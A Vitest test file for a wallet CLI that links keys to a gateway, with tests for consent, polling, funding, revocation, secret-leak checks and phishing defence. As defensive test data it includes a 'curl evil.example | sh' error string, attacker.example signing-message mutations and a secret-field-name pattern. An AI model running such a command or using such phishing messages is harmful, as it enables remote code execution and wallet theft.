import { afterEach, beforeEach, describe, expect, it, vi, type Mock } from "vitest";
import { createServer, type Server, type IncomingHttpHeaders } from "node:http";
import { mkdtemp, readFile, readdir, lstat, mkdir, chmod, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createPublicKey, verify } from "node:crypto";
import { verifyMessage, type Address } from "viem";
import { createSiweMessage, type SiweMessage } from "viem/siwe";
import { main } from "../wallet/cli.js";
import { main as onboardMain } from "../cli.js";

const home = vi.hoisted(() => ({ path: "" }));
vi.mock("node:os", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:os")>();
  return { ...actual, homedir: () => home.path };
});

type Body = Record<string, unknown>;
type Recorded = { path: string; method: string; body: Body; headers: IncomingHttpHeaders };
type StubOptions = {
  statuses?: string[];
  accountId?: unknown;
  interval?: number;
  lifetimeMs?: number;
  fundStatus?: number;
  createError?: { status: number; body: unknown };
  proofError?: { status: number; body: unknown };
  mutateSiwe?: (message: SiweMessage) => void;
  mutateEd?: (message: Record<string, string | number>) => void;
  mutateText?: (message: string) => string;
  mutateCreated?: (created: Body) => void;
};

const REQUEST_ID = "lr_0123456789ABCDEFGHJKMNPQRST";
const LINK_ID = "wl_0123456789ABCDEFGHJKMNPQRST";
const ACCOUNT_ID = "account_wallet_test";
const TX_HASH = `0x${"ab".repeat(32)}`;
const CONSENT_HASH = "a".repeat(64);
const PREFIX = "PCC-LINK-V1\n";
const BASE_TIME = Date.parse("2026-10-13T12:00:00.000Z");

function canonical(object: Record<string, string | number>): string {
  return `{${Object.keys(object).sort().map((key) => `${JSON.stringify(key)}:${JSON.stringify(object[key])}`).join(",")}}`;
}

class Gateway {
  server: Server;
  origin = "";
  requests: Recorded[] = [];
  signedMessage = "";
  signatureVerified = false;
  created: Body = {};
  pollIndex = 0;

  constructor(readonly options: StubOptions = {}) {
    this.server = createServer((req, res) => {
      void (async () => {
        const chunks: Buffer[] = [];
        for await (const chunk of req) chunks.push(Buffer.from(chunk));
        const raw = Buffer.concat(chunks).toString("utf8");
        const body = raw ? JSON.parse(raw) as Body : {};
        await this.handle(req, body, (status, data) => {
          res.writeHead(status, { "content-type": "application/json" });
          res.end(JSON.stringify(data));
        });
      })().catch(() => {
        res.writeHead(500, { "content-type": "application/json" });
        res.end('{"error":"stub_failure"}');
      });
    });
  }

  private async handle(
    req: { method?: string; url?: string; headers: IncomingHttpHeaders },
    body: Body,
    reply: (status: number, data: unknown) => void,
  ): Promise<void> {
    const path = req.url ?? "";
    this.requests.push({ path, method: req.method ?? "", body, headers: req.headers });
    if (path === "/api/wallets/link-requests" && req.method === "POST") {
      if (this.options.createError) {
        reply(this.options.createError.status, this.options.createError.body);
        return;
      }
      this.created = body;
      const expiresAt = new Date(clock + (this.options.lifetimeMs ?? 600_000)).toISOString();
      if (body.keyType === "secp256k1") {
        const message: SiweMessage = {
          domain: new URL(this.origin).host,
          address: body.address as Address,
          statement: `Link this key to PCC as an ${body.role} ("${body.label}"). PCC never holds this key. Consent: wallet-link v1.`,
          uri: `${this.origin}/link`,
          version: "1",
          chainId: 84532,
          nonce: "PCCNonce1234567890",
          issuedAt: new Date(clock),
          expirationTime: new Date(expiresAt),
          requestId: REQUEST_ID,
          resources: [
            `urn:pcc:link-request:${REQUEST_ID}`,
            "urn:pcc:env:test",
            `urn:pcc:role:${body.role}`,
            `urn:pcc:consent:wallet-link-v1:sha256:${CONSENT_HASH}`,
          ],
        };
        this.options.mutateSiwe?.(message);
        this.signedMessage = createSiweMessage(message);
      } else {
        const message: Record<string, string | number> = {
          chainId: 84532,
          consent: `wallet-link-v1:sha256:${CONSENT_HASH}`,
          domain: new URL(this.origin).host,
          env: "test",
          expirationTime: expiresAt,
          issuedAt: new Date(clock).toISOString(),
          label: body.label as string,
          nonce: "PCCNonce1234567890",
          publicKey: body.publicKey as string,
          requestId: REQUEST_ID,
          role: body.role as string,
          uri: `${this.origin}/link`,
        };
        this.options.mutateEd?.(message);
        this.signedMessage = PREFIX + canonical(message);
      }
      this.signedMessage = this.options.mutateText?.(this.signedMessage) ?? this.signedMessage;
      const created: Body = {
        requestId: REQUEST_ID,
        userCode: "BCDF-GHJK",
        verificationUri: `${this.origin}/link`,
        message: this.signedMessage,
        expiresAt,
        interval: this.options.interval ?? 5,
      };
      this.options.mutateCreated?.(created);
      reply(201, created);
      return;
    }
    if (path === `/api/wallets/link-requests/${REQUEST_ID}/proof` && req.method === "POST") {
      if (this.options.proofError) {
        reply(this.options.proofError.status, this.options.proofError.body);
        return;
      }
      if (this.created.keyType === "secp256k1") {
        this.signatureVerified = await verifyMessage({
          address: this.created.address as Address,
          message: this.signedMessage,
          signature: body.signature as `0x${string}`,
        });
      } else {
        const publicKey = createPublicKey({
          key: Buffer.concat([Buffer.from("302a300506032b6570032100", "hex"), Buffer.from(this.created.publicKey as string, "hex")]),
          format: "der",
          type: "spki",
        });
        this.signatureVerified = typeof body.signature === "string" && /^[0-9a-f]{128}$/.test(body.signature)
          && verify(null, Buffer.from(this.signedMessage, "utf8"), publicKey, Buffer.from(body.signature, "hex"));
      }
      reply(this.signatureVerified ? 200 : 401, this.signatureVerified ? { status: "awaiting_approval" } : { error: "invalid_proof" });
      return;
    }
    if (path === `/api/wallets/link-requests/${REQUEST_ID}` && req.method === "GET") {
      const statuses = this.options.statuses ?? ["authorization_pending", "slow_down", "approved"];
      const status = statuses[Math.min(this.pollIndex++, statuses.length - 1)];
      reply(200, status === "approved" ? { status, linkId: LINK_ID, accountId: this.options.accountId ?? ACCOUNT_ID } : { status });
      return;
    }
    if (path === `/api/wallets/${LINK_ID}/fund` && req.method === "POST") {
      const status = this.options.fundStatus ?? 200;
      reply(status, status < 300 ? { status: "funded", txHashes: [TX_HASH] } : { error: "funding_failed" });
      return;
    }
    if (path === `/api/wallets/${LINK_ID}/revoke` && req.method === "POST") {
      reply(200, { status: "revoked", revokedAt: new Date(clock).toISOString() });
      return;
    }
    reply(404, { error: "not_found" });
  }

  async start(): Promise<this> {
    // Restricted runners can opt into the same signed-message gateway handler
    // without a socket. Native node:http on 127.0.0.1:0 remains the default.
    if (process.env.PCC_WALLET_TEST_TRANSPORT === "memory") {
      this.origin = `http://127.0.0.1:${3200 + gateways.length}`;
      gateways.push(this);
      vi.spyOn(globalThis, "fetch").mockImplementation(async (input, init) => {
        const url = new URL(input instanceof Request ? input.url : String(input));
        const gateway = gateways.find((candidate) => candidate.origin === url.origin);
        if (!gateway) throw new Error("stub_unknown_origin");
        const body = init?.body ? JSON.parse(String(init.body)) as Body : {};
        const headers = Object.fromEntries(new Headers(init?.headers).entries());
        let response: Response | undefined;
        await gateway.handle({ method: init?.method ?? "GET", url: url.pathname + url.search, headers }, body, (status, data) => {
          response = new Response(JSON.stringify(data), { status, headers: { "content-type": "application/json" } });
        });
        if (!response) throw new Error("stub_missing_response");
        return response;
      });
      return this;
    }
    await new Promise<void>((resolve, reject) => {
      const onError = (error: Error): void => reject(error);
      this.server.once("error", onError);
      this.server.listen(0, "127.0.0.1", () => {
        this.server.off("error", onError);
        resolve();
      });
    });
    const address = this.server.address();
    if (!address || typeof address === "string") throw new Error("stub_address_unavailable");
    this.origin = `http://127.0.0.1:${address.port}`;
    gateways.push(this);
    return this;
  }

  proofs(): Recorded[] { return this.requests.filter((request) => request.path.endsWith("/proof")); }
  async close(): Promise<void> {
    if (!this.server.listening) return;
    this.server.closeAllConnections();
    await new Promise<void>((resolve, reject) => this.server.close((error) => error ? reject(error) : resolve()));
  }
}

let temporaryRoot: string;
let walletDir: string;
let clock: number;
let stdout: string[];
let stderr: string[];
let sleeps: number[];
let gateways: Gateway[];
let prompt: Mock<[], Promise<string>>;

beforeEach(async () => {
  temporaryRoot = await mkdtemp(join(tmpdir(), "pcc-wallet-cli-test-"));
  home.path = join(temporaryRoot, "home");
  await mkdir(home.path, { mode: 0o700 });
  walletDir = await mkdtemp(join(temporaryRoot, "wallets-"));
  vi.stubEnv("PCC_WALLET_DIR", walletDir);
  vi.stubEnv("PCC_API_KEY", "");
  vi.stubEnv("PCC_GATEWAY_URL", "");
  vi.stubEnv("PCC_URL", "");
  clock = BASE_TIME;
  stdout = [];
  stderr = [];
  sleeps = [];
  gateways = [];
  prompt = vi.fn(async () => "create");
});

afterEach(async () => {
  const publicOutput = stdout.join("\n") + stderr.join("\n");
  const leakText = publicOutput + gateways.map((gateway) => JSON.stringify(gateway.requests)).join("\n");
  try {
    expect(/privateKey|private_key|seed|mnemonic/i.test(leakText), "public output and gateway requests must not contain secret field names").toBe(false);
    const signatures = gateways.flatMap((gateway) => gateway.proofs()).map((request) => request.body.signature);
    expect(signatures.some((signature) => typeof signature === "string" && publicOutput.includes(signature)), "proof signatures must never appear in public output").toBe(false);
    for (const entry of await readdir(walletDir).catch(() => [])) {
      const path = join(walletDir, entry);
      const stat = await lstat(path);
      if (!stat.isFile() || !entry.endsWith(".json")) continue;
      const wallet = JSON.parse(await readFile(path, "utf8")) as Body;
      const secret = wallet.privateKey ?? wallet.seed;
      if (typeof secret !== "string") continue;
      const hex = secret.replace(/^0x/, "");
      const encodings = [hex, hex.toUpperCase(), `0x${hex}`, `0x${hex.toUpperCase()}`, Buffer.from(hex, "hex").toString("base64"), Buffer.from(hex, "hex").toString("base64url")];
      expect(encodings.some((encoding) => leakText.includes(encoding)), "generated secret must never appear in public output or requests").toBe(false);
    }
  } finally {
    await Promise.all(gateways.map((gateway) => gateway.close()));
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    await rm(temporaryRoot, { recursive: true, force: true });
  }
});

function runtime(stdinIsTTY = false) {
  return {
    stdout: (text: string) => { stdout.push(text); },
    stderr: (text: string) => { stderr.push(text); },
    stdinIsTTY,
    prompt,
    now: () => clock,
    sleep: async (ms: number) => { sleeps.push(ms); clock += ms; },
  };
}

async function run(gateway: Gateway, command = "init", extra: string[] = [], role = "agent", label = "wallet-test", tty = false): Promise<number> {
  return main([command, "--gateway", gateway.origin, "--label", label, "--role", role, ...extra], runtime(tty));
}

async function stored(label = "wallet-test"): Promise<Body> {
  return JSON.parse(await readFile(join(walletDir, `${label}.json`), "utf8")) as Body;
}

async function linked(options: StubOptions = {}): Promise<Gateway> {
  const gateway = await new Gateway({ statuses: ["approved"], ...options }).start();
  expect(await run(gateway, "init", ["--yes"])).toBe(0);
  stdout.length = 0;
  stderr.length = 0;
  return gateway;
}

describe("pcc-wallet ceremony", () => {
  it("wallet help describes commands and exits zero without a role", async () => {
    expect(await main(["--help"], runtime())).toBe(0);
    const output = stdout.join("\n");
    for (const command of ["init", "link", "fund", "status", "revoke", "export-address"]) expect(output).toContain(command);
    expect(await readdir(walletDir)).toEqual([]);
  });

  it("onboard wallet delegates to the same wallet help entry", async () => {
    vi.spyOn(process.stdout, "write").mockImplementation(((chunk: string | Uint8Array) => {
      stdout.push(typeof chunk === "string" ? chunk : Buffer.from(chunk).toString("utf8"));
      return true;
    }) as typeof process.stdout.write);
    vi.spyOn(process.stderr, "write").mockImplementation(((chunk: string | Uint8Array) => {
      stderr.push(typeof chunk === "string" ? chunk : Buffer.from(chunk).toString("utf8"));
      return true;
    }) as typeof process.stderr.write);
    expect(await onboardMain(["wallet", "--help"])).toBe(0);
    expect(stdout.join("\n")).toContain("export-address");
  });

  it.each([["agent", "secp256k1"], ["device", "ed25519"]])("full init for %s/%s verifies proof, slows polling, links and funds", async (role, keyType) => {
    const gateway = await new Gateway().start();
    expect(await run(gateway, "init", ["--yes"], role)).toBe(0);
    const output = stdout.join("\n");
    expect(output).toContain("BCDF-GHJK");
    expect(output).toContain(`${gateway.origin}/link`);
    expect(output).toContain("ready");
    expect(output).toContain("funded");
    expect(output).toContain(TX_HASH);
    expect(gateway.signatureVerified).toBe(true);
    expect(sleeps).toEqual([5000, 5000, 10000]);
    const wallet = await stored();
    expect(wallet.kind).toBe("pcc-wallet");
    expect(wallet.version).toBe(1);
    expect(wallet.role).toBe(role);
    expect(wallet.keyType).toBe(keyType);
    expect(wallet.chainId).toBe(84532);
    expect(wallet.gatewayOrigin).toBe(gateway.origin);
    expect(wallet.link).toMatchObject({ requestId: REQUEST_ID, linkId: LINK_ID, accountId: ACCOUNT_ID, status: "approved" });
    expect(gateway.requests.filter((request) => request.path.endsWith("/fund"))[0]?.body).toEqual({});
    for (const request of gateway.requests.filter((request) => request.method === "POST")) expect(request.headers["content-type"]).toContain("application/json");
  });

  it.each([["agent", "ed25519"], ["device", "secp256k1"]])("supports explicit %s/%s key selection", async (role, keyType) => {
    const gateway = await new Gateway({ statuses: ["approved"] }).start();
    expect(await run(gateway, "init", ["--yes", "--key-type", keyType], role)).toBe(0);
    expect(gateway.signatureVerified).toBe(true);
    expect((await stored()).keyType).toBe(keyType);
  });

  it("prints exact filled consent text before key creation", async () => {
    const gateway = await new Gateway({ statuses: ["approved"] }).start();
    prompt.mockImplementation(async () => {
      expect(await readdir(walletDir)).toEqual([]);
      return "create";
    });
    expect(await run(gateway)).toBe(0);
    const consent = `pcc wallet init --role agent --label wallet-test\nThis creates a NEW wallet key on this computer:\n  file      ${join(walletDir, "wallet-test.json")} (mode 0600)\n  network   Base Sepolia (test network). Test funds have no value.\n  custody   only this file. PCC never receives it and cannot recover it.\nNext: your PCC account owner approves the link in a browser; then test funds arrive.\nType "create" to continue:`;
    expect(stdout.join("\n")).toContain(consent);
    expect(prompt).toHaveBeenCalledTimes(1);
  });

  it("--yes on a TTY still prompts for create", async () => {
    const gateway = await new Gateway({ statuses: ["approved"] }).start();
    expect(await run(gateway, "init", ["--yes"], "agent", "wallet-test", true)).toBe(0);
    expect(prompt).toHaveBeenCalledTimes(1);
  });

  it("--yes on a TTY cancellation prompts and creates no file or HTTP request", async () => {
    prompt.mockResolvedValue("cancel");
    const fetch = vi.spyOn(globalThis, "fetch").mockRejectedValue(new Error("unexpected_http_request"));
    expect(await main(["init", "--role", "agent", "--label", "wallet-test", "--gateway", "http://127.0.0.1:3200", "--yes"], runtime(true))).not.toBe(0);
    expect(prompt).toHaveBeenCalledTimes(1);
    expect(fetch).not.toHaveBeenCalled();
    expect(await readdir(walletDir)).toEqual([]);
  });

  it("--yes on non-TTY skips the typed word", async () => {
    const gateway = await new Gateway({ statuses: ["approved"] }).start();
    expect(await run(gateway, "init", ["--yes"])).toBe(0);
    expect(prompt).not.toHaveBeenCalled();
  });

  it("a different consent word refuses creation", async () => {
    const gateway = await new Gateway().start();
    prompt.mockResolvedValue("approve");
    expect(await run(gateway)).not.toBe(0);
    expect(await readdir(walletDir)).toEqual([]);
    expect(gateway.requests).toHaveLength(0);
  });

  it("--chain-id 8453 is refused before any file exists", async () => {
    const gateway = await new Gateway().start();
    expect(await run(gateway, "init", ["--yes", "--chain-id", "8453"])).not.toBe(0);
    expect(await readdir(walletDir)).toEqual([]);
    expect(gateway.requests).toHaveLength(0);
  });

  it("--encrypt is refused with not in v1 before creation", async () => {
    const gateway = await new Gateway().start();
    expect(await run(gateway, "init", ["--yes", "--encrypt"])).not.toBe(0);
    expect(stderr.join("\n")).toContain("not in v1");
    expect(await readdir(walletDir)).toEqual([]);
  });

  it.each(["../escape", "bad label", "a".repeat(65), ""])('refuses invalid label "%s" before creation', async (label) => {
    const gateway = await new Gateway().start();
    expect(await run(gateway, "init", ["--yes"], "agent", label)).not.toBe(0);
    expect(await readdir(walletDir)).toEqual([]);
    expect(gateway.requests).toHaveLength(0);
  });

  it.each(["denied", "expired", "failed"])("%s exits nonzero with a clear line and never funds", async (status) => {
    const gateway = await new Gateway({ statuses: [status] }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect([...stdout, ...stderr].join("\n")).toContain(status);
    expect(gateway.requests.some((request) => request.path.endsWith("/fund"))).toBe(false);
    expect((await stored()).link).toMatchObject({ status });
  });

  it("stops polling at the request expiry", async () => {
    const gateway = await new Gateway({ statuses: ["authorization_pending"], lifetimeMs: 12_000 }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect([...stdout, ...stderr].join("\n")).toContain("expired");
    expect(clock).toBeLessThanOrEqual(BASE_TIME + 12_000);
    expect(gateway.pollIndex).toBe(2);
  });

  it("honours the server polling interval", async () => {
    const gateway = await new Gateway({ interval: 7 }).start();
    expect(await run(gateway, "init", ["--yes"])).toBe(0);
    expect(sleeps).toEqual([7000, 7000, 12000]);
  });

  it("fund 404 prints linked (unfunded) and exits zero without ready", async () => {
    const gateway = await new Gateway({ statuses: ["approved"], fundStatus: 404 }).start();
    expect(await run(gateway, "init", ["--yes"])).toBe(0);
    const output = [...stdout, ...stderr].join("\n");
    expect(output).toContain("funding is not available on this gateway; ask the operator for test funds");
    expect(output).toContain("linked (unfunded)");
    expect(output).not.toContain("ready");
  });

  it("fund 502 exits nonzero and prints only HTTP status for the error", async () => {
    const gateway = await new Gateway({ statuses: ["approved"], fundStatus: 502 }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(stderr.join("\n").trim()).toMatch(/^(?:HTTP )?502$/);
    expect(stdout.join("\n")).not.toContain("ready");
  });

  it("fund command uses only the isolated fund endpoint", async () => {
    const gateway = await linked();
    gateway.requests.length = 0;
    expect(await run(gateway, "fund")).toBe(0);
    expect(gateway.requests.map((request) => request.path)).toEqual([`/api/wallets/${LINK_ID}/fund`]);
    expect(gateway.requests[0]?.body).toEqual({});
    expect(stdout.join("\n")).toContain(TX_HASH);
  });

  it("revoke without owner key gives dashboard guidance and exit 2", async () => {
    const gateway = await linked();
    gateway.requests.length = 0;
    expect(await run(gateway, "revoke")).toBe(2);
    expect([...stdout, ...stderr].join("\n")).toContain("revoke from the dashboard (Wallets → Unlink), or pass an owner API key");
    expect(gateway.requests).toHaveLength(0);
  });

  it.each(["flag", "env"])("revoke uses Bearer owner API key from %s", async (source) => {
    const gateway = await linked();
    gateway.requests.length = 0;
    if (source === "env") vi.stubEnv("PCC_API_KEY", "owner-api-token");
    expect(await run(gateway, "revoke", [...(source === "flag" ? ["--api-key", "owner-api-token"] : []), "--reason", "operator_unlink"])).toBe(0);
    expect(gateway.requests[0]?.headers.authorization).toBe("Bearer owner-api-token");
    expect(gateway.requests[0]?.body).toEqual({ reason: "operator_unlink" });
    expect((await stored()).link).toMatchObject({ status: "revoked" });
  });

  it("revoke refuses an invalid reason before a request", async () => {
    const gateway = await linked();
    gateway.requests.length = 0;
    expect(await run(gateway, "revoke", ["--api-key", "owner-api-token", "--reason", "Bad Reason"])).not.toBe(0);
    expect(gateway.requests).toHaveLength(0);
  });

  it.each(["agent", "device"])("export-address for %s prints only public identifier", async (role) => {
    const gateway = await new Gateway({ statuses: ["approved"] }).start();
    expect(await run(gateway, "init", ["--yes"], role)).toBe(0);
    stdout.length = 0;
    stderr.length = 0;
    gateway.requests.length = 0;
    expect(await run(gateway, "export-address", [], role)).toBe(0);
    const wallet = await stored();
    expect(stdout.join("\n").trim()).toBe(wallet.address ?? wallet.publicKey);
    expect(gateway.requests).toHaveLength(0);
  });

  it("status shows local public facts and refreshes the stored request status", async () => {
    const gateway = await linked();
    gateway.requests.length = 0;
    expect(await run(gateway, "status")).toBe(0);
    const wallet = await stored();
    const output = stdout.join("\n");
    expect(output).toContain(wallet.address as string);
    expect(output).toContain("agent");
    expect(output).toContain("secp256k1");
    expect(output).toContain("approved");
    expect(gateway.requests.map((request) => request.path)).toEqual([`/api/wallets/link-requests/${REQUEST_ID}`]);
  });

  it("link reuses an existing keystore after denial without changing its public identifier", async () => {
    const gateway = await new Gateway({ statuses: ["denied"] }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    const originalAddress = (await stored()).address;
    gateway.options.statuses = ["approved"];
    gateway.pollIndex = 0;
    expect(await run(gateway, "link")).toBe(0);
    expect(gateway.signatureVerified).toBe(true);
    expect((await stored()).address).toBe(originalAddress);
    expect((await stored()).link).toMatchObject({ linkId: LINK_ID, accountId: ACCOUNT_ID });
    expect(prompt).not.toHaveBeenCalled();
  });

  it("gateway error response prints the error code only", async () => {
    const gateway = await new Gateway({ createError: { status: 429, body: { error: "rate_limited", detail: "must never be echoed" } } }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(stderr.join("\n").trim()).toBe("rate_limited");
    expect([...stdout, ...stderr].join("\n")).not.toContain("must never be echoed");
  });

  it("proof gateway errors are sanitized without logging the signature", async () => {
    const gateway = await new Gateway({ proofError: { status: 401, body: { error: "invalid_proof", detail: "untrusted extra text" } } }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(stderr.join("\n").trim()).toBe("invalid_proof");
    const signature = gateway.proofs()[0]?.body.signature;
    expect(typeof signature).toBe("string");
    expect([...stdout, ...stderr].join("\n").includes(signature as string), "signature must not be logged").toBe(false);
  });

  it.each(["message", "requestId", "expiresAt", "interval"])("refuses malformed create response %s without a proof", async (field) => {
    const gateway = await new Gateway({ mutateCreated: (created) => { created[field] = null; } }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(gateway.proofs()).toHaveLength(0);
  });
});

describe("pcc-wallet phishing defence", () => {
  const siweCases: Array<[string, (message: SiweMessage) => void]> = [
    ["domain", (message) => { message.domain = "attacker.example"; }],
    ["uri", (message) => { message.uri = "https://attacker.example/link"; }],
    ["chainId", (message) => { message.chainId = 8453; }],
    ["address", (message) => { message.address = "0x0000000000000000000000000000000000000001"; }],
    ["requestId", (message) => { message.requestId = "lr_wrong_request"; }],
    ["statement", (message) => { message.statement = "Authorize unlimited spending."; }],
    ["resources", (message) => { message.resources = message.resources?.filter((resource) => !resource.startsWith("urn:pcc:link-request:")); }],
    ["resources", (message) => { message.resources = message.resources?.filter((resource) => !resource.startsWith("urn:pcc:role:")); }],
    ["consent", (message) => { message.resources = message.resources?.filter((resource) => !resource.startsWith("urn:pcc:consent:")); }],
    ["consent", (message) => { message.resources?.push(`urn:pcc:consent:wallet-link-v1:sha256:${CONSENT_HASH}`); }],
    ["expirationTime", (message) => { message.expirationTime = new Date(BASE_TIME - 1); }],
    ["issuedAt", (message) => { message.issuedAt = new Date(BASE_TIME + 300_001); }],
    ["issuedAt", (message) => { message.issuedAt = new Date(BASE_TIME - 600_001); }],
  ];

  it.each(siweCases)("secp256k1 refuses to sign %s mismatch %#", async (field, mutateSiwe) => {
    const gateway = await new Gateway({ mutateSiwe }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(stderr.join("\n")).toContain(`refusing to sign: ${field} mismatch`);
    expect(gateway.proofs()).toHaveLength(0);
  });

  const edCases: Array<[string, (message: Record<string, string | number>) => void]> = [
    ["domain", (message) => { message.domain = "attacker.example"; }],
    ["uri", (message) => { message.uri = "https://attacker.example/link"; }],
    ["chainId", (message) => { message.chainId = 8453; }],
    ["publicKey", (message) => { message.publicKey = "b".repeat(64); }],
    ["requestId", (message) => { message.requestId = "lr_wrong_request"; }],
    ["role", (message) => { message.role = "agent"; }],
    ["label", (message) => { message.label = "another-label"; }],
    ["expirationTime", (message) => { message.expirationTime = new Date(BASE_TIME - 1).toISOString(); }],
    ["issuedAt", (message) => { message.issuedAt = new Date(BASE_TIME + 300_001).toISOString(); }],
    ["issuedAt", (message) => { message.issuedAt = new Date(BASE_TIME - 600_001).toISOString(); }],
  ];

  it.each(edCases)("ed25519 refuses to sign %s mismatch %#", async (field, mutateEd) => {
    const gateway = await new Gateway({ mutateEd }).start();
    expect(await run(gateway, "init", ["--yes"], "device")).not.toBe(0);
    expect(stderr.join("\n")).toContain(`refusing to sign: ${field} mismatch`);
    expect(gateway.proofs()).toHaveLength(0);
  });

  it.each([
    ["extra whitespace", (message: string) => message.replace(PREFIX + "{", PREFIX + "{ ")],
    ["duplicate key", (message: string) => message.replace(PREFIX + "{", PREFIX + '{"chainId":84532,')],
    ["reordered keys", (message: string) => {
      const object = JSON.parse(message.slice(PREFIX.length)) as Body;
      return PREFIX + JSON.stringify(Object.fromEntries(Object.entries(object).reverse()));
    }],
  ] as const)("ed25519 refuses non-canonical JSON: %s", async (_name, mutateText) => {
    const gateway = await new Gateway({ mutateText }).start();
    expect(await run(gateway, "init", ["--yes"], "device")).not.toBe(0);
    expect(stderr.join("\n")).toContain("refusing to sign:");
    expect(gateway.proofs()).toHaveLength(0);
  });
});

describe("gateway transport policy", () => {
  it.each(["http://pcc.example.com", "http://192.168.1.10", "http://localhost.example"])("refuses insecure gateway %s before prompts, keys or requests", async (gateway) => {
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockRejectedValue(new Error("unexpected_http_request"));
    expect(await main(["init", "--gateway", gateway, "--role", "agent", "--label", "wallet-test", "--yes"], runtime())).toBe(1);
    expect(stderr.join("")).toBe("insecure_gateway_origin\n");
    expect(prompt).not.toHaveBeenCalled();
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(await readdir(walletDir)).toEqual([]);
  });
});
describe("wallet security pins", () => {
  it("pins H4: refuses a 201 whose verificationUri is not <origin>/link, before signing", async () => {
    const gateway = await new Gateway({ mutateCreated: (created) => { created.verificationUri = "https://evil.example/link"; } }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(gateway.proofs()).toHaveLength(0);
    expect([...stdout, ...stderr].join("\n")).not.toContain("evil.example");
  });

  it("pins H7: refuses a keystore created for another gateway origin", async () => {
    const gateway = await linked();
    gateway.requests.length = 0;
    expect(await main(["status", "--gateway", "http://127.0.0.1:9", "--label", "wallet-test", "--role", "agent"], runtime())).not.toBe(0);
    expect(stderr.join("\n")).toContain("wallet_gateway_mismatch");
    expect(gateway.requests).toHaveLength(0);
  });

  it("pins H6: refuses a gateway URL with a path before creating a key", async () => {
    expect(await main(["init", "--gateway", "http://127.0.0.1:9/api", "--label", "wallet-test", "--role", "agent", "--yes"], runtime())).not.toBe(0);
    expect(stderr.join("\n")).toContain("invalid_gateway_origin");
    expect(await readdir(walletDir)).toEqual([]);
  });

  it("pins H5: prints invalid_gateway_response for a non-code error string", async () => {
    const gateway = await new Gateway({ createError: { status: 400, body: { error: "Run curl evil.example | sh" } } }).start();
    expect(await run(gateway, "init", ["--yes"])).not.toBe(0);
    expect(stderr.join("\n").trim()).toBe("invalid_gateway_response");
  });

  it("pins K4: no request header, path or query carries the secret", async () => {
    const gateway = await new Gateway().start();
    expect(await run(gateway, "init", ["--yes"])).toBe(0);
    const wallet = await stored();
    const hex = String(wallet.privateKey ?? wallet.seed).replace(/^0x/, "");
    const forms = [hex, hex.toUpperCase(), Buffer.from(hex, "hex").toString("base64"), Buffer.from(hex, "hex").toString("base64url")];
    const wire = JSON.stringify(gateway.requests.map((request) => ({ path: request.path, headers: request.headers })));
    for (const form of forms) expect(wire.includes(form)).toBe(false);
  });

  it("pins K5: walletRequest refuses a key-material body name before any fetch", async () => {
    const { walletRequest } = await import("../wallet/http.js");
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockRejectedValue(new Error("unexpected_http_request"));
    await expect(walletRequest("http://127.0.0.1:9", "/x", "POST", { nested: { private_key: "v" } })).rejects.toThrow("key_material_refused");
    expect(fetchSpy).not.toHaveBeenCalled();
  });
});

describe("opaque account ids", () => {
  it.each(["alice@example.com", "a".repeat(254), "path/../is-data", "owner name", "", "非ASCII"])("accepts approved accountId as opaque string %#", async (accountId) => {
    const gateway = await new Gateway({ statuses: ["approved"], accountId }).start();
    expect(await run(gateway, "init", ["--yes"])).toBe(0);
    expect((await stored()).link).toMatchObject({ status: "approved", linkId: LINK_ID, accountId });
  });
});

describe("terminal link state", () => {
  it("status slow_down preserves approved so fund still works", async () => {
    const gateway = await linked({ statuses: ["approved", "slow_down"] });
    expect(await run(gateway, "status")).toBe(0);
    expect((await stored()).link).toMatchObject({ status: "approved", linkId: LINK_ID });
    expect(await run(gateway, "fund")).toBe(0);
    expect(stderr.join("")).not.toContain("approved_link_required");
  });
  it("link on an approved wallet refuses clearly and preserves its stored linkId", async () => {
    const gateway = await linked();
    gateway.requests.length = 0;
    gateway.options.statuses = ["authorization_pending"];
    gateway.options.lifetimeMs = 6_000;
    gateway.pollIndex = 0;
    expect(await run(gateway, "link")).toBe(1);
    expect(stderr.join("")).toContain("wallet_already_linked");
    expect((await stored()).link).toMatchObject({ status: "approved", linkId: LINK_ID, accountId: ACCOUNT_ID });
    expect(gateway.requests).toEqual([]);
  });
});
